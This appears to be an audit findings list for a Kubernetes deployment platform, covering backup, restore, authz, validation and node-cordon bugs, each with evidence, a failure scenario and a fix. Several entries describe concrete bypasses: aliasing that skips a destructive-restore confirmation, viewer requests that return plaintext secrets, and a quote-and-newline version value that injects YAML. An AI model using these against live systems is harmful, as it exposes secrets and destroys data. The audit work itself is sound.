The code comment at builds.go:2663-2667 ('if we promised a safety net and couldn't take it, don't proceed') proves intent the implementation does not deliver. Severity P1 not P0: the feature is opt-in, the nonexistent-artifact case fails loudly at restore time (aws s3 cp errors), and the corrupt-snapshot case is a race requiring an independent bad migration — serious correctness failure of a promised safety net, but not directly exploitable data loss.

title: Destructive in-place restore confirm gate bypassed by short-name/FQN aliasing of `into`
summary: The typed-confirmation check compares raw strings (`destAddon == addon`) BEFORE name resolution, but addons.CRName/GetOwned deliberately accept both short ('pg') and qualified ('myproj-pg') forms — so a restore with addon='pg' and into='myproj-pg' (or the UI's FQN in the URL with a short-name `into`) resolves srcCR and destCR to the SAME addon yet skips the confirm requirement entirely, running the destructive in-place restore with no acknowledgement.
evidence: backups.go:353-370: `destAddon := addon; if req.Into != "" { destAddon = req.Into }; if destAddon == addon && req.Confirm != destAddon { 400 }` — string compare only. backups.go:378-401 then resolves both via ownedAddon; addons.go:139-144 CRName returns a pre-qualified name unchanged, so 'pg' and 'myproj-pg' are the same CR. The List handler's own comment (backups.go:255-257) documents that the UI passes FQNs and the CLI passes short names, making mixed forms the expected input. No `srcCR.Name == destCR.Name` re-check exists after resolution.
failure_scenario: Editor-role user in the UI (addon param = FQN 'myproj-pg') tries to restore a backup 'into' what they type as 'pg', believing into must name a different addon or just echoing the addon name. destAddon('pg') != addon('myproj-pg') → confirm skipped; both resolve to myproj-pg; the Job overwrites the live production DB in place with zero confirmation — the exact blast radius the gate (mirroring AddonsHandler.Delete's ?confirm gate) exists to force acknowledgment of.
fix_sketch: Move the destructive check after resolution: require Confirm whenever destCR.Name == srcCR.Name (and accept either the short or FQN form in Confirm).
verify_reason: Traced end-to-end. backups.go:353-370 gates the destructive in-place restore with a raw string compare (`destAddon == addon`) BEFORE name resolution. addons.CRName (addons.go:139-144) is documented idempotent — 'pg' and 'myproj-pg' both resolve to CR 'myproj-pg' — and GetOwned/ownedAddon (backups.go:60-70, addons.go:173-186) accept either form; backups.go:253-259 documents that the UI passes FQNs and the CLI short names, so mixed forms are expected input. With addon='myproj-pg' (URL) and into='pg' (or the reverse), destAddon != addon skips the confirm gate, both resolve to the same CR, the kind check trivially passes (same CR), no srcCR.Name == destCR.Name re-check exists in the Into branch (backups.go:383-401), and releaseName = destCR.Name (line 424) points the `--clean --if-exists` restore Job at the live source DB — the destructive in-place restore runs with zero acknowledgement. The CLI compounds it with the same naive compare client-side (cli/cmd/kusoCli/addon_backup.go:75 `into == addon`), so `--into myproj-pg` on addon 'pg' bypasses both gates. Severity is P1, not P0: the caller must already be a project editor, who is authorized to perform this restore anyway by typing confirm — this is a bypass of an accidental-data-loss safety gate (real production-DB-overwrite blast radius, realistic trigger), not an authz bypass or attacker-exploitable capability gain.

title: External-postgres backups write no manifest — restores of them are permanently unverifiable
summary: The external-postgres backup streams `pg_dump | gzip | aws s3 cp -` and never computes a sha256 or uploads a .manifest.json sidecar (unlike the native pg/redis/mongo/mysql templates), so the restore script's integrity check always takes the 'no manifest — integrity NOT verified, proceeding' branch for every external backup, forever.
evidence: backup-cronjob.yaml:231-234 uploads the stream directly with no SHA/manifest step, while the native template at :81-92 computes SHA + writes '${KEY}.manifest.json'. backup/registry.go:52-54 restore path: `echo "==> no manifest for this backup — integrity NOT verified, proceeding"` then pipes into psql. Combined with the missing pipefail (same script, `set -eu` at :213), a truncated external dump has neither a job failure nor a checksum to catch it.
failure_scenario: Team backs up a managed Neon/RDS postgres via an external addon. A dump truncated by a dropped TLS connection uploads cleanly (exit 0). Months later they restore it: no manifest exists, the restore proceeds unverified and applies half a database; with the psql error-swallowing from the P0 finding the Job still reports success.
fix_sketch: Buffer to /tmp like the native path (dump → sha256sum → upload artifact + manifest), or tee the stream through sha256sum and upload the manifest afterward.
verify_reason: Confirmed by direct code trace: the external-postgres backup block (backup-cronjob.yaml:231-234, gated on .Values.external) streams `pg_dump | gzip | aws s3 cp -` and never computes a sha256 or uploads `${KEY}.manifest.json`, while all four native templates do (:81-92 postgres, :335-341 redis, :434-440 mongodb, :528-534 mysql). The restore script (server-go/internal/backup/registry.go:41-54) fetches `${KEY}.manifest.json` and, when absent, prints "no manifest for this backup — integrity NOT verified, proceeding" and pipes into psql — so every external-backup restore permanently takes the unverified branch, and the manifest can never be backfilled. The path is reachable: the Restore handler (handlers/backups.go:430, restoreScriptForKind) selects by Spec.Kind ("postgres" for external addons) with no external check. Severity corrected to P2, though: the reviewer's failure scenario overstates the manifest's protection. A TLS-truncated pg_dump would NOT be caught even in the native path — the SHA there is computed from the already-truncated local file (pg_dump | gzip > /tmp/dump.gz under set -eu without pipefail, :78-81), so the manifest would verify the bad artifact as OK. The manifest only detects post-upload/at-rest corruption; external-side upload truncation from S3 already fails the job because `aws s3 cp` is the last pipeline command under set -e. The truncated-dump-uploads-cleanly issue belongs to the separate missing-pipefail finding. Net: a real integrity-verification inconsistency (external backups lack at-rest corruption detection all other kinds get, and the restore proceeds — loudly — without verification), but no standalone data-loss trigger.

title: Scheduled backups of multi-DB postgres addons silently dump only the primary logical database
summary: The backup CronJob runs `pg_dump ... "${POSTGRES_DB}"` with POSTGRES_DB fixed at chart-render time (line 133), while kuso now first-classes multi-logical-DB postgres addons (the SQL browser's ?database= override, backups.go:729-735 'multi-DB servers: one addon hosting a database per tenant', commit 713c5f67) — every logical database other than the primary is never backed up and nothing surfaces that gap.
evidence: backup-cronjob.yaml:78-79 dumps exactly one database; :133 `POSTGRES_DB: .Values.database | default .Values.project | default "kuso"`. backups.go:687-737 documents and supports addons hosting a database per tenant with server-admin credentials. No pg_dumpall or per-database loop exists in any backup path (snapshot_adapter.go:61 has the same single-DB shape).
failure_scenario: Operator provisions one postgres addon hosting 'tenant_a', 'tenant_b', ... logical DBs (the documented multi-DB pattern) with a nightly backup schedule; the backup list fills with green dumps so the addon looks protected. The PVC is lost; restore recovers only the primary DB — every tenant database is gone with no backup ever taken and no warning at any point.
fix_sketch: Enumerate databases (SELECT datname FROM pg_database WHERE NOT datistemplate) and dump each to <ts>-<db>.sql.gz with per-artifact manifest entries, or at minimum detect >1 non-template DB and emit a loud 'not backed up' warning in the backup-health surface.
verify_reason: Traced exactly as claimed. backup-cronjob.yaml:78-79 runs `pg_dump -h "${POSTGRES_HOST}" -U "${POSTGRES_USER}" "${POSTGRES_DB}"` with POSTGRES_DB fixed at render time (line 133: .Values.database | default .Values.project | default "kuso"); pg_dump is per-database, so every other logical DB is skipped, the job exits 0, uploads a green manifest, and nothing surfaces the gap. Multi-DB addons are an explicitly first-classed pattern: sql_databases.go:13-17 ("a platform hosting one database per tenant inside a single shared Postgres"), backups.go:727-729, and commit 713c5f67 (2026-07-15) which added the DB picker/?database= override and names a real production deployment (saitche) holding per-tenant DBs in one addon. Verified no compensating path exists: snapshot_adapter.go:61 (pre-deploy snapshot) has the identical single-POSTGRES_DB shape; backup_download.go builds its DSN from the conn secret's POSTGRES_DB (line 265) with no database override; the HA/CNPG branch is suppressed for non-HA addons; docs/BACKUP_RESTORE.md and EXTERNAL_DB_BACKUPS.md carry no multi-DB warning. The "backup is scoped to spec.database by design" refutation fails because the product now ships UI/CLI support promoting the multi-DB pattern while every backup surface silently ignores it. Severity P1, not P0: no exploit and loss requires both the multi-DB pattern and a subsequent data-loss event — but it is silent, unrecoverable data loss with false assurance, and at least one production deployment is exposed today.

title: DeletePRAddons deletes any addon whose name ends in -pr-<N>, ignoring the preview-pr ownership label
summary: The PR-close sweep matches clones purely by the name suffix `-pr-<N>` (strings.HasSuffix) even though every clone is stamped with kuso.sislelabs.com/preview-pr=<N> at creation (previewdb.go:183-186) — a user-created addon whose name happens to end in '-pr-<N>' is deleted (helm uninstall of its StatefulSet; for instance-shared addons the provisioned logical DB) when that PR number closes.
evidence: previewdb.go:246-256: `suffix := fmt.Sprintf("-pr-%d", prNumber); ... if !strings.HasSuffix(short, suffix) { continue }; c.Addons.Delete(...)` — no label check, while EnsureEnvAddons sets extraLabels["kuso.sislelabs.com/preview-pr"] specifically 'so the env-delete sweep can enumerate the clones it owns' (addons.go:106-110 comment). PVC survives only because of the chart's helm.sh/resource-policy: keep; the addon CR, StatefulSet and conn wiring are gone.
failure_scenario: Team creates a real addon named 'events-pr-2' (pr = 'pull-requests service', 'price-report', etc.) in a project that also uses PR previews. PR #2 on any service in that project closes; the webhook sweep deletes the production addon CR — the app loses its database mid-day. Data on the PVC is recoverable only by manual re-adoption; for a UseInstanceAddon addon the delete path drops the per-project logical DB outright.
fix_sketch: Filter on a.Labels["kuso.sislelabs.com/preview-pr"] == strconv.Itoa(prNumber) (falling back to the suffix match only for pre-label legacy clones that ALSO carry LabelEnv).
verify_reason: Core defect confirmed: previewdb.go:246-256 sweeps by bare name suffix — `suffix := fmt.Sprintf("-pr-%d", prNumber); if !strings.HasSuffix(short, suffix) { continue }; c.Addons.Delete(...)` — with no check of the kuso.sislelabs.com/preview-pr label that EnsureEnvAddons stamps on every clone (previewdb.go:183-186). The create path has no guard: addons.Service.Add (addons.go:239-241) validates only non-empty name+kind, so a user CAN create an addon named events-pr-2; the webhook closed-branch (dispatcher.go:596-599) then deletes it when PR #2 closes on any previews-enabled project tracking the repo, and Addons.Delete proceeds (same-project ownership guard passes). HOWEVER the claim's worst leg is wrong: the instance-pg logical-DB drop is explicitly gated on the preview-pr LABEL (addons.go:727: `cr.Spec.UseInstanceAddon != "" && cr.Labels["kuso.sislelabs.com/preview-pr"] != ""` — comment: "so a REAL project's instance-pg addon is never dropped"), so a user-named instance addon loses only its CR, not its database. For native addons the StatefulSet/conn secret go away (outage) but data PVCs are retained and re-adding the same addon name reuses them (addons.go:742-755). Net: real trigger but needs the naming coincidence (*-pr-<digits> addon in a previews-enabled project + that PR number closing), and the blast radius is a recoverable outage, not data loss — P2, not P1.

title: Env-var values leak unmasked through every non-GetService endpoint
summary: The admin-only env-value mask (envMaskSentinel) is applied only in GetService (projects.go:516-522), GetEnv (848-852) and Spec (615-636); every other handler that returns a full KusoService or KusoEnvironment CR sends plaintext env-var values to viewers and editors.
evidence: ListServices (projects.go:467-479, viewer-gated) does writeJSON(w, 200, out) on []kube.KusoService whose Spec.EnvVars carry literal values (proved by GetService's own masking loop over out.Spec.EnvVars[i].Value). Same for Describe (390-402, DescribeResponse embeds raw Services+Environments), ListEnvironments (1140-1152) and GetEnvironment (1181-1193) — KusoEnvironmentSpec.EnvVars (kube/types.go:645) is seeded with a full copy of the service's vars at AddService. Editor-gated mutation endpoints echo the full CR too: PatchService (665), AddDomain (688), RemoveDomain (707), SetEnvVar (752), UnsetEnvVar (771), AddEnvironment (1178), AddEnvDomain/SetEnvDomains (env_domains.go:42,69). The codebase explicitly treats this as a security boundary: SetEnvScopedVar refuses to echo the env CR for exactly this reason (env_domains.go handler:121-125 'carries every env-var override VALUE in plaintext... must not see values').
failure_scenario: A user with only viewer role on project P calls GET /api/projects/P/services (or GET /api/projects/P, or GET /api/projects/P/envs) and reads DATABASE_URL, API keys and webhook secrets in cleartext — the same values GetEnv and GetService would have masked as '••••••••'. An editor gets the same via any PATCH/domain/env-var mutation response.
fix_sketch: Apply the callerCanReadSecrets() mask uniformly wherever a Service/Environment CR (or DescribeResponse) is serialized: mask out.Spec.EnvVars values in ListServices, Describe, ListEnvironments, GetEnvironment, and in the responses of PatchService/AddDomain/RemoveDomain/SetEnvVar/UnsetEnvVar/AddEnvironment/AddEnvDomain/SetEnvDomains (or switch the mutation endpoints to 204 like SetEnvScopedVar).
verify_reason: Traced end-to-end. The admin-only mask (callerCanReadSecrets → PermSecretsRead, authz.go:161-165) is applied only in GetService (projects.go:516-522), GetEnv (848-852), and Spec export (615-636). ListServices (467-479, viewer-gated) writeJSONs []kube.KusoService straight from listServicesForProject (projects_ops.go:566-586), which does no redaction; KusoEnvVar.Value is a plain `json:"value,omitempty"` string (kube/types.go:426) with no custom MarshalJSON, and writeJSON (projects.go:1338-1342) is a bare json.Encoder — so viewers get every literal env value in cleartext. Same for Describe (390-402, DescribeResponse embeds raw Services+Environments per projects_ops.go:35-76), ListEnvironments (1140-1152) and GetEnvironment (1181-1193); KusoEnvironmentSpec.EnvVars (types.go:644) is confirmed seeded with 'a full copy of the service's vars' by the comment at types.go:652-653. Editor-gated mutators echo full CRs too: PatchService (665), AddDomain (688), RemoveDomain (707), SetEnvVar (752), UnsetEnvVar (771), AddEnvironment (1178), SetEnvDomains/AddEnvDomain/RemoveEnvDomain (env_domains.go:42,69,85). The codebase itself documents the boundary being violated — SetEnvScopedVar/UnsetEnvScopedVar deliberately return 204 because the env CR 'carries every env-var override VALUE in plaintext... an editor who lacks secrets:read must not see values' (env_domains.go:121-125,140-143), and the Spec-export comment calls an unmasked read 'a plaintext-secret read for any viewer'. Severity corrected to P1: real, trivially triggered authz-boundary bypass, but the attacker must already be an authenticated project member (viewer/editor) on a single-tenant cluster — an intra-team privilege-tier leak, not unauthenticated/cross-tenant compromise, data loss, or RCE.

title: AddEnvironment env literal drops SecurityContext/Healthcheck/PublicEnv/Release/Snapshot/Image
summary: The custom-env CR literal built by AddEnvironment (services_ops.go:952-1007) omits SecurityContext, Healthcheck, PublicEnv, Release, SnapshotBeforeDeploy and Image, all of which the production-env literal (line 592) and propagate.go stamp — so a freshly created staging/qa env silently loses these behaviors.
evidence: The literal at 952-1007 sets Internal/PrivateEgress/PlatformAPIEgress/Stopped/Sleep/EnvFromSecrets/EnvVars/SharedEnvKeys/SubscribedAddons/Placement/Volumes/Resources/Runtime/Command and nothing else. Compare the production literal at 592-648 which sets Healthcheck, SecurityContext, Release, SnapshotBeforeDeploy, Image/PendingImage. Propagation only repairs some of these later: PublicEnv/Healthcheck/SecurityContext mirror unconditionally on the NEXT service save (propagate.go:173-181), but Release/SnapshotBeforeDeploy are gated on changed.Release/changed.Snapshot (propagate.go:312-317) so they never arrive unless the user edits the release hook itself. Image is never propagated for runtime=image services (build poller ignores runtime=image).
failure_scenario: POST /api/projects/P/services/S/envs {name:'staging',branch:'develop'} for (a) a setpriv-based image needing spec.securityContext → staging pod crashes exit 127 (the documented marketplace-caps bug resurrected); (b) a service with publicEnv → staging serves literal '__KUSO_RUNTIME_KEY__' sentinels; (c) a service with a release hook → staging builds promote WITHOUT running migrations, indefinitely, because env.Spec.Release stays nil; (d) a runtime=image service → staging env has no spec.image, chart holds 0 replicas forever.
fix_sketch: Copy the missing fields from svc.Spec into the AddEnvironment literal exactly as the production literal does (SecurityContext, Healthcheck, PublicEnv, Release, SnapshotBeforeDeploy, and Image for runtime=image), and add a regression test diffing the two literals' populated field sets.
verify_reason: Traced the exact failure paths. The AddEnvironment env literal (services_ops.go:952-1006) provably omits SecurityContext, Healthcheck, PublicEnv, Release, SnapshotBeforeDeploy, and Image/PendingImage, all of which the production literal stamps (637-646, 633-634) except PublicEnv (which production also omits — minor evidence error in the claim, the gap is still real). Consequences confirmed in consumers: (a) chart renders securityContext solely from env .Values.securityContext (kusoenvironment deployment.yaml:189-193) → setpriv images crash exit 127 on staging until any later service save (propagation of SecurityContext is unconditional at propagate.go:181 but the whole pass is gated on changed.any(), propagate.go:109); (b) sentinel substitution reads env .Values.publicEnv (deployment.yaml:252) while builds bake sentinels from the service spec → staging serves literal __KUSO_RUNTIME_*__ until the next save; (c) the migration gate shouldRunRelease (builds/builds.go:2870-2878) reads env.Spec.Release, and propagate.go:312 copies it only when changed.Release → staging promotes without migrations indefinitely unless the user edits the release hook; (d) for runtime=image, no code path ever writes env.Spec.Image for a custom env (builds refused at builds.go:553-555; imagerelease watcher requires PendingImage; PatchService req.Image touches only the service spec with no changedFields.Image; envs_ops.go has no image setter) and the chart pins replicas: 0 when image.repository is empty (deployment.yaml:33) → env dead forever. Corroboration: CreateEnvGroup (env_groups.go:534-548) explicitly seeds production's image with a comment describing this exact empty-image failure, showing the newer path was fixed while AddEnvironment was not. P1 not P0: silent, real-trigger correctness failures on every custom env, two of which (Release, Image) never self-heal, but blast radius is staging/qa envs — no production data loss, authz bypass, or RCE.

title: AddService production-env literal drops PublicEnv
summary: CreateServiceRequest.PublicEnv is mapped through apiv1 (handlers/projects.go:130) and stamped on the service spec (services_ops.go:479) but the auto-created production env literal (592-648) never sets Spec.PublicEnv, and the kusoenvironment chart reads only the env CR for sentinel substitution.
evidence: grep PublicEnv in services_ops.go: only line 479 (service spec literal) and 2290-2291 (PatchService). Neither KusoEnvironmentSpec literal (592, 952) sets it. propagate.go:173 mirrors env.Spec.PublicEnv = svc.Spec.PublicEnv only inside propagateChangedToEnvs, which runs on a later PatchService/SetEnv — not at create. kube/types.go PublicEnv doc: 'the env chart substitutes each with its real runtime value at pod start'.
failure_scenario: POST /api/projects/P/services {name:'web', publicEnv:['NEXT_PUBLIC_API_URL'], ...} → 201; first build bakes __KUSO_RUNTIME_NEXT_PUBLIC_API_URL__ sentinels, but the production env CR has no spec.publicEnv so the chart's substitution step never runs — the deployed app serves the raw sentinel string until any unrelated service-spec edit triggers propagation.
fix_sketch: Add PublicEnv: created.Spec.PublicEnv to the production-env literal at services_ops.go:592-648 (and to the AddEnvironment literal per the previous finding).
verify_reason: Failure path traced end-to-end. (1) handlers/projects.go:130 maps publicEnv through on create (spec/apply.go:249 does too for kuso.yml-created services). (2) services_ops.go:479 stamps it on the KusoService literal, but the auto-created production KusoEnvironmentSpec literal (592-648) omits PublicEnv — as does the custom-env literal at 952-1006. (3) builds.go:815 copies svcCR.Spec.PublicEnv onto the build CR, so the first image bakes __KUSO_RUNTIME_<KEY>__ sentinels. (4) promoteEnvImageCAS (builds.go:2490-2563) patches only spec.image/replicaCount/annotations on the env. (5) The kusoenvironment chart (deployment.yaml:252-255) renders KUSO_PUBLIC_ENV only from .Values.publicEnv, i.e. the env CR spec — empty means the entrypoint substitution never runs and the pod serves raw sentinel strings. (6) No self-heal: drift.go has no PublicEnv handling; the only mirror is propagate.go:173 inside propagateChangedToEnvs, whose callers (SetEnv at services_ops.go:1399, PatchService at :2340, shared-env/subscription ops) all run on later edits, never at create. This is another instance of the known AddService env-literal field-drop class (SecurityContext/Resources/Release previously). Severity P2 not P1: trigger requires publicEnv in the initial create request (the common set-env-after-create flow goes through SetEnv/PatchService which propagates and heals), any subsequent service edit fixes it, and there is no data loss or security impact — but the first deploy is functionally broken with no signal pointing at the cause.

title: Addon version/storageSize accepted verbatim into helm templates
summary: addons.Service.Add validates only name/kind non-empty, TLS enum, HA-kind and mutual-exclusion; Version and StorageSize are stamped onto the CR unvalidated and flow verbatim into helm templates (image: "postgres:{{ $version }}", PVC storage: {{ .Values.storageSize }}), so a bad value returns 201 and wedges the addon at reconcile — or worse, breaks out of the template.
evidence: addons.go:239-322 has no validation of req.Version or req.StorageSize (Update path likewise sets addon.Spec.Version = *req.Version at 519-521 with no check). operator/helm-charts/kusoaddon/templates/_helpers.tpl:142-144 emits .Values.storageSize verbatim; postgres.yaml:103 renders image: "postgres:{{ $version }}". No resource.ParseQuantity call exists anywhere in internal/addons (grep confirmed).
failure_scenario: POST /api/projects/P/addons {name:'db',kind:'postgres',storageSize:'10Gigs'} → 201 Created, but the rendered PVC quantity is invalid so the helm release fails every reconcile — addon never provisions, and per the known VCT-annotation incident a persistently failing kusoaddon upgrade degrades the operator's reconcile loop. A version like '16"' (or one embedding quote+newline) breaks the quoted image scalar — render failure at best, crafted-YAML injection into the pod spec at worst, from an editor-level token.
fix_sketch: In Add and Update: parse StorageSize with k8s.io/apimachinery resource.ParseQuantity (reject non-positive), and restrict Version to a safe image-tag charset (^[A-Za-z0-9._-]{1,128}$), returning ErrInvalid.
verify_reason:
The validation gap is real and traceable. addons.Service.Add (addons.go:239-322) validates only name/kind non-empty (240-242), TLS enum (317-321), HA-kind (332-335), and external/useInstanceAddon mutual-exclusion (323-325); Version (306) and StorageSize (309) are stamped onto the CR verbatim with no format check. The HTTP handler (handlers/addons.go:28-39) is a pure passthrough, so nothing validates before the domain call. Update likewise assigns addon.Spec.Version = *req.Version with no check (519-521); the StorageSize guard at 542-543 only rejects a *changed* value (immutability), not an invalid one. grep confirms no resource.ParseQuantity anywhere in internal/addons (it exists in podsize/settings/buildcontroller, so the omission is an inconsistent gap, not a missing capability). The CRD schema types both fields as bare strings with no pattern/format (kusoaddons.yaml:74-75, 172-173), so arbitrary strings are admitted by the API server. The helm path is verbatim: _helpers.tpl "kusoaddon.storageSize" emits {{ .Values.storageSize }} into `storage: {{ include ... }}` across all engine templates, and postgres.yaml:103 renders image: "postgres:{{ $version }}". So POST {storageSize:"10Gigs"} → 201, then the rendered PVC quantity is invalid and the StatefulSet apply is rejected at reconcile → addon never provisions (wedged, needs manual delete). CONFIRMED as a missing-validation / wedged-reconcile bug.

Severity downgraded to P2 because two of the reviewer's amplifiers do not hold: (1) "degrades the operator reconcile loop" borrowed from the VCT incident is unsupported — that incident stamped an immutable annotation onto EVERY addon, whereas here only the one addon with the bad value fails to render, so blast radius is a single self-inflicted addon; (2) the "crafted-YAML injection into pod spec" angle crosses no privilege boundary in kuso's single-tenant model — an addon editor can already run arbitrary images and container specs, so YAML injection grants nothing new (worst realistic case is a helm render/parse failure, i.e. another wedged addon). No data loss, no authz bypass, trigger requires an already-privileged editor. That is a narrow correctness/robustness bug: P2.

title: No kube-name validation and no IsInvalid mapping: bad names return 500
summary: Project names (and spec.namespace), addon names, and cron names are only checked for non-emptiness; invalid kube names/label values reach the apiserver, whose 422 Invalid error is not mapped by any fail() helper (no errors.Is/apierrors.IsInvalid case), so well-formed-JSON-but-bad-name requests surface as 500 'internal'.
evidence: projects_ops.go:104-128 validates only empty/reserved/kuso- prefix; the CR carries Labels{labelProject: req.Name} (line 169) so >63-char or non-[a-z0-9-] names fail apiserver label validation, and CreateKusoProject's error is returned raw (191-193). addons.go:240 ('name and kind are required' only; name and kind also become label values, 269-273). crons.go:223/305 (name non-empty only; CRName(project,service,name) is the CR name). None of the three fail() helpers (handlers/projects.go:1317-1334, handlers/addons.go:462-477, handlers/crons.go:220-234) has a case for apierrors.IsInvalid — grep for IsInvalid across projects/addons/crons packages returns nothing.
failure_scenario: POST /api/projects {"name":"My_Project"} (or a 70-char name, or POST /api/projects/p/addons {"name":"Bad Name","kind":"postgres"}, or a cron named 'Foo Bar') → apiserver rejects the CR/label → handler logs an error and returns 500 'internal' instead of 400 with an actionable message; CLI/UI users see a generic failure and ops sees noise in error logs.
fix_sketch: Validate names against RFC1123/label rules (and length budget: project+service+env composite names must stay under the 63-char label / 53-char helm-release limits) at the domain boundary returning ErrInvalid; additionally map apierrors.IsInvalid/IsBadRequest to 400 in the shared fail() helpers as defense in depth. Also validate CreateProjectRequest.Namespace (projects_ops.go:174,188) the same way.
verify_reason: Traced end-to-end. projects_ops.go:104-128 validates only empty/reserved/kuso- prefix; the raw name becomes metadata.name and a label value (lines 166-170) and CreateKusoProject's error returns unwrapped (191-194). addons.go:240 checks only non-empty name/kind (both become label values, 269-273); crons.go:223/305 check only non-empty name (flows into CRName as the CR name). Grep for IsInvalid across server-go hits only internal/secrets/secrets.go — none of the three fail() helpers (handlers/projects.go:1317-1334, handlers/addons.go:462-477, handlers/crons.go:220-234) has a case for apierrors.IsInvalid, so the apiserver's 422 StatusError matches no domain sentinel and falls to default → 500 "internal" + error log. The gap is real (service names ARE regex-validated via serviceNameRE at services_ops.go:253/666, proving apiserver-delegation isn't the convention). Severity corrected to P3: the create correctly fails and nothing is persisted; impact is only a wrong status code, generic message, and log noise, with project creation admin-gated — no data loss, security, or stuck-state consequence.

title: Cron schedule validator accepts out-of-range values; cron saves but never fires
summary: cronExpr only checks that the schedule is 5 whitespace-separated fields of [digits*/,-]; it does not range-check field values, so schedules like '99 99 * * *' or '0-70 * * * *' pass validation, the KusoCron CR is created (201), and the rendered CronJob is rejected by the apiserver at reconcile — the cron silently never fires.
evidence: crons.go:150 regexp `^[\d\*\/\,\-]+\s+...` matches '99 99 * * *'. The comment block at 139-149 documents this exact failure mode for '?' ('cron CR appears to save successfully, never fires, no UI feedback') — the fix rejected macros and '?' but left numeric ranges unchecked. kube CronJob validation parses the schedule (robfig) and rejects out-of-range fields, so the helm-rendered CronJob fails admission hours later with no API feedback.
failure_scenario: POST /api/projects/P/services/S/crons {"name":"nightly","schedule":"0 25 * * *","command":["backup"]} → 201 Created; the CronJob is rejected at reconcile ('hour out of range'), the job never runs, and the user's nightly backup silently doesn't happen.
fix_sketch: Parse the schedule with github.com/robfig/cron/v3's standard parser (the same grammar kube uses) in validateSchedule instead of the shape-only regex; return ErrInvalid with the parser's message.
verify_reason: Traced end-to-end. (1) crons.go:150 regex `^[\d\*\/\,\-]+\s+...` matches any digit-run per field with zero range semantics — '0 25 * * *' and '0-70 * * * *' pass; validateSchedule (crons.go:156-171) adds only empty/@-macro/regex checks, and no robfig or other cron parser exists anywhere in server-go (grep). (2) No downstream guard before the CR lands: the KusoCron CRD declares schedule as bare `type: string` with no pattern (its description even says 'Validated server-side'), and kusocron/templates/cronjob.yaml:8 renders it verbatim into CronJob.spec.schedule; Add/AddProject/Update/UpdateProject all rely solely on validateSchedule, so CreateKusoCron succeeds and the handler returns 201. (3) kube batch/v1 CronJob validation parses with robfig ParseStandard and rejects out-of-range fields, so the helm-operator's rendered CronJob fails apiserver validation at reconcile and no CronJob is ever created. (4) Silent: KusoCron has no surfaced Status/conditions in server-go (status/ and handlers/crons.go never read them), so the helm ReleaseFailed condition is invisible — exactly the failure signature the comment block at crons.go:139-149 documents for the previously-fixed '?' case ('cron CR appears to save successfully, never fires, no UI feedback'); that fix rejected '?' and macros but left numeric ranges unchecked, and crons_test.go has no out-of-range case. One wording nit: the reconcile rejection lands within seconds-to-3min, not 'hours later'. Severity P2: real, reproducible, silent failure of a user's scheduled job (e.g. nightly backup), but requires the user to submit an invalid schedule and affects only that cron — serious validation gap, not P1 systemic correctness or security.

title: reconcileReboots uncordons a node mid-apply, defeating drain and the one-node-at-a-time gate
summary: The finalize condition `if st.Phase != "rebooting" && st.Phase != "settling" && !ours { continue }` processes any Ready node carrying the pkgupdates cordon marker regardless of phase, so the 15s finalize ticker uncordons a node while its apply Job is still in phase running/draining.
failure_scenario: Operator clicks apply-with-reboot on a multi-node cluster. Apply() (apply.go:90-108) stamps phase=running, cordons the node with CordonAnnotation=true, and creates the Job. The node stays Ready while apt runs, so within 15s the finalize ticker (watcher.go:29,70-71) hits reconcileReboots: ours=true, nodeReady=true -> it uncordons the node, clears the marker (apply.go:179-188), and stomps phase running->settling; 3 minutes later (apt upgrades routinely exceed that) it stomps settling->done and emits a false 'Host patches applied' notification (apply.go:228-231) while the patch is still running. Consequences: (1) the script's own re-cordon at apply_script.go:157 is also undone within 15s, so during the 120s+ drain loop evicted pods reschedule straight back onto the node that reboots seconds later -- singletons (e.g. the pg-pooler class from the known incident) go down exactly the way the drain was built to prevent; (2) with the marker cleared and phase=settling/done, anotherNodeRebooting (apply.go:128-147) reports not-busy, so a second node's drain+reboot can start concurrently, risking loss of all replicas/quorum. apply_test.go only exercises phase=rebooting, so this path is untested.
evidence: apply.go:169-172 comment says the marker clause is 'defense in depth' but it fires for phase=running/draining too; Apply() cordons+marks BEFORE the Job runs (apply.go:100-108) and the finalize ticker runs every 15s (watcher.go:29). nodeReady stays true throughout apt upgrade.
fix_sketch: Only treat the marker as an uncordon trigger when the phase is rebooting/settling/done/failed or empty -- explicitly skip running and draining (e.g. `if st.Phase == "running" || st.Phase == "draining" { continue }` before the ours clause), and add settling/draining coverage to apply_test.go.
verify_reason: Direct code trace confirms every element. Apply() (apply.go:90-108) stamps phase=running, sets CordonAnnotation=true, and creates the Job; the node stays Ready during apt. reconcileReboots' skip condition (apply.go:172) `st.Phase != "rebooting" && st.Phase != "settling" && !ours` evaluates false whenever ours=true, so a running/draining node with the marker is processed; with nodeReady=true it is uncordoned and the marker nulled (apply.go:179-187) on the first 15s finalize tick (watcher.go:29,70-71), then phase is stomped running->settling (apply.go:221-222) and settling->done + notifyApplyDone after the 3-min settleWindow (apply.go:212-231) while apt still runs. The script's re-cordon before drain (apply_script.go:157) is likewise undone within 15s of its up-to-120s eviction loop (deadline apply_script.go:103), so evicted pods can reschedule onto the about-to-reboot node — contradicting drain_node's own invariant comment (apply_script.go:74). With marker cleared and phase settling/done, anotherNodeRebooting (apply.go:128-147) finds neither signal, so a second node's drain+reboot can start concurrently, defeating the one-node-at-a-time gate. No guard checks Job liveness or scopes the `ours` clause to post-reboot, and apply_test.go only exercises reconcileReboots from phase=rebooting (lines 196, 241). Severity P1: triggers on essentially every multi-node apply-with-reboot (apt >15s), defeating both availability protections and emitting false success — serious correctness with a real trigger, but not data loss/authz/RCE, so not P0.

title: nodewatch auto-uncordon is lost across server restart and never retried on failure
summary: Recovery/uncordon is keyed solely off the in-memory `alerted` map (nodewatch.go:176-179), not the persisted CordonAnnotation, so a node that flips back to Ready while kuso-server is restarting (or after a failed uncordon patch) stays cordoned forever.
failure_scenario: Node goes NotReady >5min -> nodewatch cordons it and stamps kuso.sislelabs.com/cordoned-by-nodewatch=true. kuso-server restarts (routine: every `make ship` release roll / auto-updater tick, or a leader failover). The node recovers to Ready before the new process re-crosses the alert threshold. New process's tick takes the `ready` branch: `alerted` is empty, so no uncordon action is ever queued; the node remains spec.unschedulable=true with the nodewatch annotation indefinitely, silently stranding cluster capacity (and on a 2-node cluster leaving all workloads pinned to one box). The `node.recovered` event never fires. Same terminal state via the non-restart path: at line 177 `alerted` is deleted before the uncordon patch is attempted; if uncordonIfOurs fails once on a transient apiserver error (line 264-267 only logs), no retry ever happens because subsequent ticks see the node Ready and not-alerted. NotReadySinceAnnotation was added precisely to survive handover, but the uncordon side has no equivalent durability.
